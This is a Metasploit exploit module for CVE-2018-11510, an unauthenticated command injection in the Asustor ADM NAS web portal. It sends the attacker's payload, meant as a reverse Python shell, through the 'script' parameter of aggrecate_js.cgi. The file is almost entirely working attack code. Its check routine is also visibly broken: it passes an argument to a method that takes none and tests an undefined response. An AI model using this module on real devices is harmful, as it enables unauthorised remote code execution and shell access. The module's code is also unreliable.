##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Asustor ADM Unauthenticated Remote Code Execution in ADM 3.1.2.RHG1',
      'Description'    => %q{
          This module exploits an OS Command Injection vulnerability in Asustor 
          ADM 3.1.2.RHG1. Unauth :) Requires associated reverse_python_unencoded payload.
      },
      'License'        => MSF_LICENSE,
      'Author' =>
        [
          'Kyle Lovett (@SquirrelBuddha)',
          'Matthew Fulton (@haqur)'
        ],
      'References' =>
        [
          ['CVE', '2018-11510'],
          ['URL', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11510']
        ],
      'Privileged'     => false,
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Targets' =>
        [
          ['CMD',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix'
            }
          ]
        ],
      'DisclosureDate' => 'May 27 2018',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8001]),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('URI', [true, 'The base path', '/portal/apis/aggrecate_js.cgi']),
        OptString.new('SHELL',[true,'system shell to use', '/bin/sh'])
      ])
  end

  def check
    txt = Rex::Text.rand_text_alpha(8)
    http_send_command(txt)
    if res && res.body =~ '/apis/aggrecate_js.cgi'
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command()
    uri = normalize_uri(datastore['URI'])
    first = "launcher%22%26"
    middle = payload.raw
    last = "%26%22"
    cp = first << middle << last
    res = send_request_raw({
     'uri' => uri + "?script="+cp,
     'method' => 'GET'
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Failed to execute the command.')
    end
    res
  end

  def exploit
    http_send_command()
  end
end
